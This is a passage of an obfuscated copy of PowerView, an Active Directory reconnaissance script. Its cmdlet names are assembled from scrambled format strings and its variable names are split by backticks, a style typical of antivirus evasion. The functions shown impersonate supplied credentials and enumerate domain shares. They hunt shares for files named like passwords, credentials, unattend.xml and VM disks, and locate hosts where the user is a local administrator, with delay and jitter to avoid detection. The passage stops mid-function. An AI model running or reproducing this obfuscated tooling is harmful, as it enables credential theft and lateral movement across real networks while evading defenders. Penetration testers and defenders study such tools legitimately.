                ${nu`LL} = &("{4}{6}{5}{2}{0}{1}{3}"-f'r','Impersona','e','tion','Inv','s','oke-U') -TokenHandle ${tO`ke`NHanD`lE} -Quiet
            }

            ForEach (${T`ARG`eTCo`M`puter} in ${co`mPu`Te`RNAme}) {
                ${up} = &("{0}{1}{2}{3}"-f'T','e','st-Conn','ection') -Count 1 -Quiet -ComputerName ${T`ARG`eTcoMpUt`er}
                if (${uP}) {
                    # get the shares for this host and check what we find
                    ${sh`A`ReS} = &("{2}{1}{0}"-f 'e','t-NetShar','Ge') -ComputerName ${tArG`E`TcOm`pU`TeR}
                    ForEach (${ShA`Re} in ${Sh`AReS}) {
                        ${Sh`A`RenAme} = ${SHa`Re}.Name
                        # $Remark = $Share.Remark
                        ${pa`Th} = '\\'+${TARgetC`om`PU`TER}+'\'+${sHArEN`A`ME}

                        if ((${s`ha`RenAMe}) -and (${ShaR`ENA`Me}.trim() -ne '')) {
                            # see if we want to check access to this share
                            if (${cHEckS`H`AREacC`esS}) {
                                # check if the user has access to this path
                                try {
                                    ${nu`lL} = [IO.Directory]::GetFiles(${PA`Th})
                                    ${sH`Are}
                                }
                                catch {
                                    &("{0}{4}{2}{1}{3}"-f'Wri','os','e-Verb','e','t') "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                ${SH`A`Re}
                            }
                        }
                    }
                }
            }

            if (${T`OKenHa`NdLE}) {
                &("{3}{4}{1}{2}{0}{5}" -f 'S','e','vertTo','In','voke-R','elf')
            }
        }

        ${l`OgO`NtOkEn} = ${n`ULL}
        if (${ps`BOU`ND`pARamETERs}['Credential']) {
            if (${Psb`oU`NDpa`R`AmETErs}['Delay'] -or ${pSB`OUN`dpara`MeTERs}['StopOnSuccess']) {
                ${lo`go`NtoKeN} = &("{6}{3}{2}{5}{1}{0}{4}" -f'ers','p','ke-Us','vo','onation','erIm','In') -Credential ${CReDENt`i`AL}
            }
            else {
                ${LoGO`N`TOkEn} = &("{0}{1}{5}{6}{2}{4}{3}" -f 'I','nv','U','rImpersonation','se','oke','-') -Credential ${Cr`ed`EntiAl} -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (${pSBoUN`DPARaME`T`ERS}['Delay'] -or ${PSBOu`NDpa`RAmete`Rs}['StopOnSuccess']) {

            &("{1}{2}{0}{3}" -f'rbo','W','rite-Ve','se') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
            &("{0}{2}{1}"-f 'Write-Verb','e','os') "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
            ${COun`TeR} = 0
            ${R`AN`DNo} = &("{1}{2}{0}" -f'ject','New-','Ob') ("{0}{2}{1}"-f'S','dom','ystem.Ran')

            ForEach (${tA`RGE`TC`oMPU`TER} in ${TAR`GetC`omP`UTE`Rs}) {
                ${co`U`NTER} = ${cO`U`NTeR} + 1

                # sleep for our semi-randomized interval
                &("{2}{1}{0}{3}" -f '-Sle','tart','S','ep') -Seconds ${R`AnDNo}.Next((1-${J`i`TTER})*${D`elAY}, (1+${J`I`TteR})*${de`LAy})

                &("{0}{1}{2}{3}" -f 'W','rite','-Verbo','se') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                &("{1}{2}{0}"-f 'mand','In','voke-Com') -ScriptBlock ${h`O`stEn`Umblo`cK} -ArgumentList ${tarGe`TCo`mPUter}, ${chE`CKsh`AreACc`EsS}, ${LoGonT`ok`En}
            }
        }
        else {
            &("{3}{0}{2}{1}" -f 'i','e','te-Verbos','Wr') "[Find-DomainShare] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            ${scr`IpTp`Ar`A`MS} = @{
                'CheckShareAccess' = ${cH`EcKShAREaCc`e`SS}
                'TokenHandle' = ${Log`OntO`kEN}
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            &("{5}{1}{2}{3}{4}{0}"-f 'n','w-Thr','ea','dedFun','ctio','Ne') -ComputerName ${taRge`T`COm`Pu`TErS} -ScriptBlock ${Hos`TE`NUm`BLOCK} -ScriptParameters ${S`C`RIP`Tparams} -Threads ${tH`REA`Ds}
        }
    }

    END {
        if (${lOg`O`NtO`Ken}) {
            &("{5}{0}{4}{2}{1}{3}"-f 'vert','el','oS','f','T','Invoke-Re') -TokenHandle ${Lo`gO`NtOKEn}
        }
    }
}


function fIn`d`-INTereS`T`IN`gdoMaiN`SHA`REfiLe {
<#
.SYNOPSIS

Searches for files matching specific criteria on readable shares
in the domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, Find-InterestingFile, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. It will then use Find-InterestingFile on each
readhable share, searching for files marching specific criteria. If -Credential
is passed, then Invoke-UserImpersonation is used to impersonate the specified
user before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER SharePath

Specifies one or more specific share paths to search, in the form \\COMPUTER\Share

.PARAMETER ExcludedShares

Specifies share paths to exclude, default of C$, Admin$, Print$, IPC$.

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-InterestingDomainShareFile

Finds 'interesting' files on the current domain.

.EXAMPLE

Find-InterestingDomainShareFile -ComputerName @('windows1.testlab.local','windows2.testlab.local')

Finds 'interesting' files on readable shares on the specified systems.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DEV\dfm.a', $SecPassword)
Find-DomainShare -Domain testlab.local -Credential $Cred

Searches interesting files in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('DNSHostName')]
        [String[]]
        ${c`oMpU`Te`RNa`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Comput`E`RD`OMAiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`Mp`UteR`lDap`Fi`lTEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mpU`Te`RsearChB`A`sE},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${C`OMPu`T`ERopEr`ATINg`S`ysTem},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${comP`U`Te`RsERV`icepACk},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${C`oM`pu`Te`RSItenamE},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        ${in`cLu`de} = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        ${shAre`Pa`TH},

        [String[]]
        ${EXCLUd`EdSh`AREs} = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LAsT`A`c`ceS`stime},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${lA`STw`RItE`T`iMe},

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${CreAtI`O`N`TImE},

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        ${OFficEd`O`Cs},

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        ${FR`ES`hExeS},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SeR`Ver},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Se`AR`cHsCO`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`U`lTpA`geSiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RVeRTiM`e`lIM`IT},

        [Switch]
        ${to`mbst`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReDent`iAl} = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        ${D`E`LaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JItT`eR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${T`HREAdS} = 20
    )

    BEGIN {
        ${C`OMput`eRseAr`ChE`RaR`G`UMEN`Ts} = @{
            'Properties' = 'dnshostname'
        }
        if (${P`sBOUndPAraM`E`T`ers}['ComputerDomain']) { ${coMp`U`TERSeArChERaR`gumEN`TS}['Domain'] = ${CoM`pu`T`er`dOMAIn} }
        if (${Ps`BOUndpArAM`etE`RS}['ComputerLDAPFilter']) { ${C`O`MPuteRSeA`R`ChEr`A`RgumENTs}['LDAPFilter'] = ${COMP`U`T`ERlDAP`FILTER} }
        if (${P`Sbou`NdPA`RaMet`Ers}['ComputerSearchBase']) { ${coMPuTerSE`AR`che`RArGUm`ENTs}['SearchBase'] = ${CO`mpU`TeRS`eArChb`A`SE} }
        if (${PSB`O`UN`DPara`Meters}['ComputerOperatingSystem']) { ${CoMpU`TE`RsEar`c`hErarguments}['OperatingSystem'] = ${OP`ERA`TINGs`y`steM} }
        if (${Psb`OUNd`pAr`AmeT`E`RS}['ComputerServicePack']) { ${CoMp`UTer`s`EAr`che`R`ARg`Um`entS}['ServicePack'] = ${sERv`IC`EP`Ack} }
        if (${PsB`OUNdpAr`AMe`T`E`RS}['ComputerSiteName']) { ${comPUte`RSEAR`cHe`Rar`gumEntS}['SiteName'] = ${s`iTEn`Ame} }
        if (${psBO`Undpa`Ra`METeRS}['Server']) { ${COM`PU`TERsear`Ch`ErA`RguME`NTS}['Server'] = ${S`e`RVer} }
        if (${psBoU`NDpAra`MET`Ers}['SearchScope']) { ${c`oM`pUTErs`earcHErA`R`GumE`NTs}['SearchScope'] = ${S`eAr`CHScoPe} }
        if (${P`sBOUN`DpARAm`e`Te`RS}['ResultPageSize']) { ${C`OmpUTER`sEa`RC`HERArgUmENtS}['ResultPageSize'] = ${r`e`sULTP`AgES`ize} }
        if (${Ps`BOU`N`D`paRAMet`eRS}['ServerTimeLimit']) { ${C`OmP`UteRSea`Rc`heRaRguM`eNTS}['ServerTimeLimit'] = ${serVe`R`TImE`lIMIT} }
        if (${PSBOU`NDPaRam`E`Te`RS}['Tombstone']) { ${Co`mPUtERseaRCH`eRaRG`U`MenTS}['Tombstone'] = ${to`MbsT`ONE} }
        if (${PsB`oUNdp`A`R`AMeT`Ers}['Credential']) { ${C`oMputErsEaRc`Hera`RGU`M`EnTs}['Credential'] = ${C`R`EdEnt`IAl} }

        if (${PSBOun`dpARa`M`e`TeRs}['ComputerName']) {
            ${tArg`eTCO`MpU`TerS} = ${c`oMpute`RNAMe}
        }
        else {
            &("{2}{3}{0}{1}" -f 'te-Ve','rbose','Wr','i') '[Find-InterestingDomainShareFile] Querying computers in the domain'
            ${tArGeTC`om`P`Ut`ErS} = &("{2}{4}{0}{1}{3}{5}" -f't-Do','mainC','G','ompu','e','ter') @ComputerSearcherArguments | &("{3}{2}{1}{0}" -f 't','Objec','ct-','Sele') -ExpandProperty ("{1}{0}{2}" -f 'sh','dn','ostname')
        }
        &("{2}{0}{1}" -f'bo','se','Write-Ver') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if (${taR`geTco`mP`UT`ErS}.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        ${HOSt`EN`U`mBLO`ck} = {
            Param(${comp`UTERn`A`me}, ${i`N`ClUDe}, ${eXCLuDeDs`H`AReS}, ${oF`FiCe`docs}, ${Exc`LuDeHi`D`dEn}, ${F`RESh`exes}, ${C`hECKW`RiTeACce`SS}, ${tO`ken`haN`dLE})

            if (${t`OKEnHa`N`dle}) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                ${n`ULL} = &("{5}{0}{3}{2}{4}{1}"-f'e-U','on','erI','s','mpersonati','Invok') -TokenHandle ${to`ke`NHaNDlE} -Quiet
            }

            ForEach (${tA`RG`Etco`mpuTeR} in ${cO`MpUtEr`NA`Me}) {

                ${s`EArcH`S`HAReS} = @()
                if (${taRg`ETcOmPu`TEr}.StartsWith('\\')) {
                    # if a share is passed as the server
                    ${S`Earc`HS`hARes} += ${Tar`geTCoM`p`UT`Er}
                }
                else {
                    ${up} = &("{3}{1}{0}{2}" -f'nn','est-Co','ection','T') -Count 1 -Quiet -ComputerName ${TAr`g`ETcOm`PUt`ER}
                    if (${Up}) {
                        # get the shares for this host and display what we find
                        ${shAr`es} = &("{0}{1}{2}"-f 'G','e','t-NetShare') -ComputerName ${TARGEtCO`M`pU`TEr}
                        ForEach (${S`hArE} in ${sH`AReS}) {
                            ${s`haR`EnAme} = ${S`Ha`Re}.Name
                            ${p`ATH} = '\\'+${TA`RgeTcO`mp`UTeR}+'\'+${S`h`AReNA`ME}
                            # make sure we get a real share name back
                            if ((${sHA`Re`NamE}) -and (${Sh`AR`eNaMe}.Trim() -ne '')) {
                                # skip this share if it's in the exclude list
                                if (${eXclU`DEDS`hAr`ES} -NotContains ${ShaReN`A`mE}) {
                                    # check if the user has access to this path
                                    try {
                                        ${N`Ull} = [IO.Directory]::GetFiles(${P`ATH})
                                        ${S`eArCh`SHareS} += ${p`Ath}
                                    }
                                    catch {
                                        &("{2}{1}{0}"-f'rbose','rite-Ve','W') "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${sh`ARE} in ${S`EaRchs`Ha`R`ES}) {
                    &("{0}{2}{1}" -f'Writ','bose','e-Ver') "Searching share: $Share"
                    ${sEa`RC`h`ARgs} = @{
                        'Path' = ${SH`Are}
                        'Include' = ${INC`L`UdE}
                    }
                    if (${OFF`ICE`dOCS}) {
                        ${sEa`R`CH`ARgS}['OfficeDocs'] = ${of`FIC`e`docS}
                    }
                    if (${frE`ShE`XEs}) {
                        ${sE`Ar`chArgS}['FreshEXEs'] = ${F`ReS`hexes}
                    }
                    if (${LAsTa`cc`eSSt`imE}) {
                        ${Se`Archar`gS}['LastAccessTime'] = ${l`AstAc`c`EsStimE}
                    }
                    if (${l`AStWR`It`E`TIme}) {
                        ${sEa`Rch`AR`gS}['LastWriteTime'] = ${lA`sT`w`RiTe`Time}
                    }
                    if (${C`RE`AtIoNtI`Me}) {
                        ${Se`ARcH`ARgs}['CreationTime'] = ${Cre`Ati`ONTime}
                    }
                    if (${C`HE`CK`Writ`eAcCeSs}) {
                        ${SEar`CH`Args}['CheckWriteAccess'] = ${C`Heck`WrItEAcC`EsS}
                    }
                    &("{5}{6}{3}{1}{4}{0}{2}" -f'i','erestin','le','nt','gF','Find-','I') @SearchArgs
                }
            }

            if (${t`OkE`NHAndle}) {
                &("{3}{0}{1}{4}{2}"-f'nvoke','-R','ToSelf','I','evert')
            }
        }

        ${lO`GoN`ToKen} = ${N`ULL}
        if (${pSb`Oun`D`paRaMet`eRs}['Credential']) {
            if (${PSB`OU`ND`ParA`mETERS}['Delay'] -or ${psBoUn`d`pA`RametERS}['StopOnSuccess']) {
                ${LoGoNTO`k`En} = &("{4}{1}{0}{2}{3}" -f 'oke-UserImpersona','nv','tio','n','I') -Credential ${CRE`D`ent`iAL}
            }
            else {
                ${L`OG`O`NToKeN} = &("{5}{3}{6}{4}{0}{1}{2}"-f'n','a','tion','-Us','so','Invoke','erImper') -Credential ${Cr`e`de`NTiAl} -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (${P`sBOundp`ARAMeTe`Rs}['Delay'] -or ${PS`BoUnD`paR`AmEteRS}['StopOnSuccess']) {

            &("{3}{0}{2}{1}"-f 'e-','erbose','V','Writ') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
            &("{1}{3}{2}{0}" -f 'ose','Wr','-Verb','ite') "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
            ${CoUn`TEr} = 0
            ${RaND`No} = &("{3}{0}{1}{2}" -f 'ew','-','Object','N') ("{2}{3}{1}{0}" -f'om','d','System.','Ran')

            ForEach (${tARG`EtcOMpUt`er} in ${Ta`RGEtCO`MPUt`Ers}) {
                ${C`Oun`TeR} = ${C`oun`Ter} + 1

                # sleep for our semi-randomized interval
                &("{2}{1}{0}" -f'leep','-S','Start') -Seconds ${R`AnD`No}.Next((1-${jiT`T`ER})*${D`E`LAY}, (1+${J`iTtER})*${DE`L`Ay})

                &("{2}{0}{1}"-f 'rite-V','erbose','W') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                &("{2}{0}{3}{1}"-f'nvoke-','ommand','I','C') -ScriptBlock ${HO`S`TenumBL`O`Ck} -ArgumentList ${Tar`gE`T`CO`MpuTer}, ${Incl`Ude}, ${eX`clU`ded`SHAReS}, ${o`FfI`cedoCS}, ${eXcLu`d`eH`I`DDEN}, ${fRe`sH`EXEs}, ${cHE`CKWriTe`Acc`E`SS}, ${L`ogon`ToKEn}
            }
        }
        else {
            &("{0}{2}{1}"-f'Write-','bose','Ver') "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            ${Scr`iPtPA`RAms} = @{
                'Include' = ${IN`cLUDE}
                'ExcludedShares' = ${EXclUdeDsH`AR`ES}
                'OfficeDocs' = ${offI`cE`DocS}
                'ExcludeHidden' = ${ex`cLUd`Ehi`DDEn}
                'FreshEXEs' = ${f`REsH`ExeS}
                'CheckWriteAccess' = ${C`h`eckw`RIT`eacceSs}
                'TokenHandle' = ${log`On`TOkEn}
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            &("{1}{2}{3}{0}" -f'ion','New-ThreadedFu','nc','t') -ComputerName ${T`ARGET`cOmPUt`E`RS} -ScriptBlock ${hoS`TeNU`M`BLoCK} -ScriptParameters ${sCrIpt`pA`RaMS} -Threads ${TH`RE`ADs}
        }
    }

    END {
        if (${LoGo`N`T`OKeN}) {
            &("{4}{2}{3}{5}{0}{1}"-f'el','f','-R','evert','Invoke','ToS') -TokenHandle ${lOgoN`To`KEN}
        }
    }
}


function fInD-`lOcAl`AdMInACcE`Ss {
<#
.SYNOPSIS

Finds machines on the local domain where the current user has local administrator access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Test-AdminAccess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and for each computer it checks if the current user
has local administrator access using Test-AdminAccess. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

Idea adapted from the local_admin_search_enum post module in Metasploit written by:
    'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
    'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
    'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-LocalAdminAccess

Finds machines in the current domain the current user has admin access to.

.EXAMPLE

Find-LocalAdminAccess -Domain dev.testlab.local

Finds machines in the dev.testlab.local domain the current user has admin access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-LocalAdminAccess -Domain testlab.local -Credential $Cred

Finds machines in the testlab.local domain that the user with the specified -Credential
has admin access to.

.OUTPUTS

String

Computer dnshostnames the current user has administrative access to.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [Alias('DNSHostName')]
        [String[]]
        ${c`Omp`UT`ERnAme},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`m`p`UteRdOM`AIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`Om`p`U`TErlDa`PFILTer},

        [ValidateNotNullOrEmpty()]
        [String]
        ${comPuteRSea`Rc`h`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${cOmP`UT`ErOper`ATINgS`y`stEm},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${cOMpU`TER`S`eRVICEP`Ack},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${Com`p`U`TeRSiTeNAME},

        [Switch]
        ${C`HEckS`H`AReAcCEsS},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sEr`V`ER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${Se`ARc`h`sCOpE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reSu`l`TPAGe`SI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErVE`RtI`ME`LI`M`IT},

        [Switch]
        ${toMbs`T`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eDen`TI`Al} = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`l`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JITt`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${Thr`e`ADS} = 20
    )

    BEGIN {
        ${cOm`PUTE`R`seARCHEr`Ar`gUMentS} = @{
            'Properties' = 'dnshostname'
        }
        if (${P`sb`oUndP`A`RAMetErs}['ComputerDomain']) { ${cO`Mp`UTErsEa`Rc`He`RA`RgUM`E`NTS}['Domain'] = ${cO`M`PuTe`RdOmA`IN} }
        if (${pSB`o`UNdp`ArAmetERs}['ComputerLDAPFilter']) { ${Co`MPU`TEr`SearCh`ERaRGUMEntS}['LDAPFilter'] = ${C`oMP`U`TErldaPF`IlT`Er} }
        if (${p`SB`OunDpaRAMet`eRS}['ComputerSearchBase']) { ${cOM`pUtERs`EA`RC`HerarGuMeNtS}['SearchBase'] = ${CoMpU`Te`R`seaR`c`HBase} }
        if (${P`SbOUNdP`AR`Am`E`Ters}['Unconstrained']) { ${compUt`E`R`seaR`CHER`ARgUme`NtS}['Unconstrained'] = ${UNc`on`stRa`ineD} }
        if (${p`SboUnD`P`ArAMeTERS}['ComputerOperatingSystem']) { ${coM`PuT`erSE`ARC`hE`R`ARGU`mENts}['OperatingSystem'] = ${OPe`RAtiNg`S`yS`Tem} }
        if (${p`sb`o`Undpa`Ram`eTeRs}['ComputerServicePack']) { ${CoMPUt`E`RsEArChe`RaRgum`EN`TS}['ServicePack'] = ${serv`I`Cepack} }
        if (${psbOunDPara`m`EtE`RS}['ComputerSiteName']) { ${Comp`UtersEArcHera`RG`Ume`NTS}['SiteName'] = ${S`iTEN`Ame} }
        if (${PSBo`U`N`dPar`AmETERs}['Server']) { ${Co`mpU`T`erSearCHeRaRGUMen`Ts}['Server'] = ${sER`VEr} }
        if (${P`SBOu`NDPArAM`et`ERS}['SearchScope']) { ${cOMpUt`eRS`earcHEra`RgUm`enTS}['SearchScope'] = ${sE`A`RchscOPE} }
        if (${P`sBouN`d`P`A`RAmETeRS}['ResultPageSize']) { ${cOmP`UTERS`eaRCHE`RARGUm`ENTS}['ResultPageSize'] = ${rE`SultP`Age`s`ize} }
        if (${ps`BounD`pARaMe`T`erS}['ServerTimeLimit']) { ${comPUtersEa`RChE`RA`RgUM`en`TS}['ServerTimeLimit'] = ${SErVE`R`TiME`LIm`It} }
        if (${PsboUn`d`PaRam`EteRS}['Tombstone']) { ${c`OMPuTErSeArc`h`erArgU`Ments}['Tombstone'] = ${t`O`m`BStone} }
        if (${Ps`B`o`UNDpa`RameTErS}['Credential']) { ${CO`m`PUter`S`eaRch`Erargu`MeNTS}['Credential'] = ${CR`E`Den`TiAl} }

        if (${pS`BOunD`P`ArAmet`ERs}['ComputerName']) {
            ${tarGETCoMP`UTE`RS} = ${co`mpUT`e`RNa`me}
        }
        else {
            &("{2}{0}{1}"-f 'os','e','Write-Verb') '[Find-LocalAdminAccess] Querying computers in the domain'
            ${tAr`ge`TcO`mputERS} = &("{1}{0}{4}{2}{3}" -f 'oma','Get-D','C','omputer','in') @ComputerSearcherArguments | &("{2}{3}{1}{0}"-f'ect','j','Select-O','b') -ExpandProperty ("{1}{2}{0}" -f'ame','d','nshostn')
        }
        &("{1}{0}{2}{3}" -f'i','Wr','te-Verbo','se') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
        if (${targ`eTC`O`mPUTE`Rs}.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        ${H`oS`TeN`UMbLOCk} = {
            Param(${c`O`m`PutERnAme}, ${toKE`NH`ANdle})

            if (${toKEN`H`AnD`lE}) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                ${Nu`lL} = &("{1}{0}{6}{5}{4}{3}{2}"-f'e-U','Invok','ion','t','rsona','pe','serIm') -TokenHandle ${t`OKENh`A`NdLe} -Quiet
            }

            ForEach (${tAR`G`eTC`Omputer} in ${c`Om`PUt`ern`AMe}) {
                ${u`p} = &("{1}{0}{2}{3}"-f 'o','Test-C','nn','ection') -Count 1 -Quiet -ComputerName ${tA`R`geT`comp`UTer}
                if (${U`P}) {
                    # check if the current user has local admin access to this server
                    ${A`cceSS} = &("{1}{0}{3}{2}"-f'd','Test-A','Access','min') -ComputerName ${t`A`RGETCO`MPuter}
                    if (${a`cce`Ss}.IsAdmin) {
